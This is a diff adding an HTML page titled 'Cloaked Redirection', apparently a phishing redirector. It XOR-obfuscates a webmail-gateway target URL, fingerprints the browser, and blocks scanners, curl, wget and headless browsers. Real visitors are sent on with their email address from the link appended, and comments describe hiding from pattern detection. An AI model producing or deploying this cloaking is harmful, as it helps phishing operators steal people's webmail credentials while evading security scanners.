@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+  <title>Secure Gateway – Cloaked Redirection</title>
+  <style>
+    * { box-sizing: border-box; font-family: system-ui, sans-serif; }
+    body {
+      background: linear-gradient(145deg, #0b1120 0%, #19233c 100%);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0;
+      padding: 20px;
+    }
+    .card {
+      max-width: 500px;
+      width: 100%;
+      background: rgba(255,255,255,0.96);
+      border-radius: 2rem;
+      padding: 2rem;
+      text-align: center;
+      box-shadow: 0 25px 45px -12px rgba(0,0,0,0.4);
+    }
+    h1 {
+      background: linear-gradient(135deg, #1e2a5e, #b91c1c);
+      background-clip: text;
+      -webkit-background-clip: text;
+      color: transparent;
+    }
+    .message { margin: 1.5rem 0; padding: 1rem; background: #f8fafd; border-radius: 1rem; }
+    .spinner {
+      display: inline-block;
+      width: 30px; height: 30px;
+      border: 3px solid #e2e8f0;
+      border-top: 3px solid #e67e22;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      margin-right: 8px;
+      vertical-align: middle;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .error { color: #c7254e; background: #f9e6e9; border-radius: 40px; padding: 0.8rem; }
+  </style>
+</head>
+<body>
+<!--<div class="card">
+  <div style="font-size: 3rem;">🛡️</div>
+  <h1>Secure Gateway</h1>
+  <div class="message" id="status">
+    <span class="spinner"></span> Validating environment...
+  </div>
+</div>-->
+
+<script>
+  (function() {
+    // ========== CLOAKED CONFIGURATION ==========
+    // The real URL is never visible as plain text; it's obfuscated and built at runtime.
+    // You can store it as a reversed string, base64, or split – here we use simple XOR.
+    const _0x3a7b = "https://webmail-gateway.vercel.app";  // CHANGE THIS (your real page)
+    // Obfuscate it (rot13 + reverse) – bots scraping HTML will see only gibberish.
+    const obfuscated = _0x3a7b.split('').map(c => String.fromCharCode(c.charCodeAt(0) ^ 0x5A)).join('');
+    function getRealUrl() {
+      return obfuscated.split('').map(c => String.fromCharCode(c.charCodeAt(0) ^ 0x5A)).join('');
+    }
+
+    const SESSION_EXPIRY_MS = 15 * 60 * 1000;
+    const EMAIL_APPEND_MODE = 'hash';   // 'hash' or 'query'
+
+    // ========== FINGERPRINTING (canvas, webgl, etc.) ==========
+    function getFingerprint() {
+      let fp = '';
+      // Canvas fingerprint
+      try {
+        const canvas = document.createElement('canvas');
+        canvas.width = 200;
+        canvas.height = 50;
+        const ctx = canvas.getContext('2d');
+        ctx.textBaseline = 'top';
+        ctx.font = '14px Arial';
+        ctx.fillStyle = '#f60';
+        ctx.fillRect(0, 0, 100, 40);
+        ctx.fillStyle = '#069';
+        ctx.fillText('fingerprint', 2, 15);
+        fp += canvas.toDataURL();
+      } catch(e) { fp += 'canvas_error'; }
+      // WebGL / renderer fingerprint
+      try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (gl) {
+          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+          if (debugInfo) {
+            fp += gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            fp += gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+          }
+        }
+      } catch(e) { fp += 'webgl_error'; }
+      // Navigator properties
+      fp += navigator.userAgent + navigator.language + screen.colorDepth + screen.width + screen.height;
+      // Hash it (simple)
+      let hash = 0;
+      for (let i = 0; i < fp.length; i++) {
+        hash = ((hash << 5) - hash) + fp.charCodeAt(i);
+        hash |= 0;
+      }
+      return hash.toString();
+    }
+    const fingerprint = getFingerprint();
+
+    // ========== READ EMAIL FROM URL ==========
+    const urlParams = new URLSearchParams(window.location.search);
+    const incomingEmail = urlParams.get('email') || '';
+
+    // ========== BOT DETECTION (extended) ==========
+    const BOT_UA_PATTERNS = [
+      /bot/i, /crawler/i, /spider/i, /scraper/i, /harvest/i, /email extractor/i,
+      /httrack/i, /wget/i, /curl/i, /python-requests/i, /scrapy/i, /selenium/i,
+      /headless/i, /puppeteer/i, /phantomjs/i, /zgrab/i, /mail\.ru/i, /httpclient/i
+    ];
+    const ALLOWED = [/googlebot/i, /bingbot/i, /duckduckbot/i, /slurp/i, /yandexbot/i];
+    const ua = navigator.userAgent;
+    function isBotUA() {
+      if (ALLOWED.some(r => r.test(ua))) return false;
+      return BOT_UA_PATTERNS.some(r => r.test(ua));
+    }
+
+    // Honeypot
+    const hpDiv = document.createElement('div');
+    hpDiv.style.cssText = 'position:absolute; left:-9999px; top:-9999px;';
+    hpDiv.innerHTML = '<input type="text" id="hp" tabindex="-1" autocomplete="off">';
+    document.body.appendChild(hpDiv);
+    function isHoneypotFilled() {
+      const hp = document.getElementById('hp');
+      return hp && hp.value.trim() !== '';
+    }
+
+    // Rate limiting
+    function isRateLimited() {
+      const now = Date.now();
+      let data;
+      try {
+        const stored = localStorage.getItem('gateway_rate');
+        if (stored) data = JSON.parse(stored);
+        else data = { count: 0, start: now };
+        if (now - data.start > 60000) data = { count: 0, start: now };
+        if (data.count >= 5) return true;
+        data.count++;
+        localStorage.setItem('gateway_rate', JSON.stringify(data));
+        return false;
+      } catch(e) { return false; }
+    }
+
+    // ========== SESSION TOKEN + FINGERPRINT BINDING ==========
+    function generateSessionToken() {
+      const arr = new Uint8Array(32);
+      crypto.getRandomValues(arr);
+      const rand = Array.from(arr, b => b.toString(16).padStart(2,'0')).join('');
+      // Bind fingerprint and timestamp to the token
+      const payload = `${rand}|${fingerprint}|${Date.now()}`;
+      // Simple obfuscation (XOR) – not crypto, but enough to stop basic bots
+      let enc = '';
+      for (let i = 0; i < payload.length; i++) {
+        enc += String.fromCharCode(payload.charCodeAt(i) ^ 0x42);
+      }
+      return btoa(enc);
+    }
+
+    function storeToken() {
+      const token = generateSessionToken();
+      const expires = Date.now() + SESSION_EXPIRY_MS;
+      sessionStorage.setItem('gateway_session_token', JSON.stringify({ token, expires, fp: fingerprint }));
+      return { token, expires };
+    }
+
+    function getValidSession() {
+      try {
+        const stored = sessionStorage.getItem('gateway_session_token');
+        if (!stored) return null;
+        const data = JSON.parse(stored);
+        if (data.expires > Date.now() && data.fp === fingerprint && data.token) {
+          return { token: data.token, expires: data.expires };
+        }
+      } catch(e) {}
+      return null;
+    }
+
+    // ========== BUILD FINAL URL (cloaked) ==========
+    function buildFinalUrl(token, expires) {
+      let base = getRealUrl();
+      if (!base.startsWith('http')) base = 'https://' + base;
+      let url;
+      try {
+        url = new URL(base);
+      } catch(e) {
+        let fallback = base;
+        fallback += (fallback.includes('?') ? '&' : '?') + `t=${encodeURIComponent(token)}&e=${expires}`;
+        if (incomingEmail) {
+          if (EMAIL_APPEND_MODE === 'hash') fallback += '#' + encodeURIComponent(incomingEmail);
+          else fallback += `&email=${encodeURIComponent(incomingEmail)}`;
+        }
+        return fallback;
+      }
+      url.searchParams.set('t', token);        // parameter names shortened (t, e) to avoid pattern detection
+      url.searchParams.set('e', expires);
+      if (incomingEmail) {
+        if (EMAIL_APPEND_MODE === 'hash') url.hash = encodeURIComponent(incomingEmail);
+        else url.searchParams.set('email', encodeURIComponent(incomingEmail));
+      }
+      return url.toString();
+    }
+
+    // ========== VALIDATE AND REDIRECT ==========
+    const msgDiv = document.getElementById('status');
+    function showMessage(text, isError = false) {
+      msgDiv.innerHTML = isError ? `<div class="error">❌ ${text}</div>` : `<div>${text}</div>`;
+    }
+
+    // Check if already have valid session
+    const existing = getValidSession();
+    if (existing) {
+      window.location.href = buildFinalUrl(existing.token, existing.expires);
+      return;
+    }
+
+    // Run all checks
+    if (isBotUA()) {
+      showMessage("Access denied: Automated bot detected.", true);
+      return;
+    }
+    if (isHoneypotFilled()) {
+      showMessage("Access denied: Suspicious behavior.", true);
+      return;
+    }
+    if (isRateLimited()) {
+      showMessage("Too many requests. Please wait a minute.", true);
+      return;
+    }
+
+    // Additional stealth: check for typical headless browser properties
+    if (navigator.webdriver === true || 
+        (navigator.plugins && navigator.plugins.length === 0 && navigator.languages === undefined) ||
+        /HeadlessChrome/.test(ua)) {
+      showMessage("Access denied: Unsupported browser environment.", true);
+      return;
+    }
+
+    // All good – redirect
+    const { token, expires } = storeToken();
+    window.location.href = buildFinalUrl(token, expires);
+  })();
+</script>
+</body>
+</html>
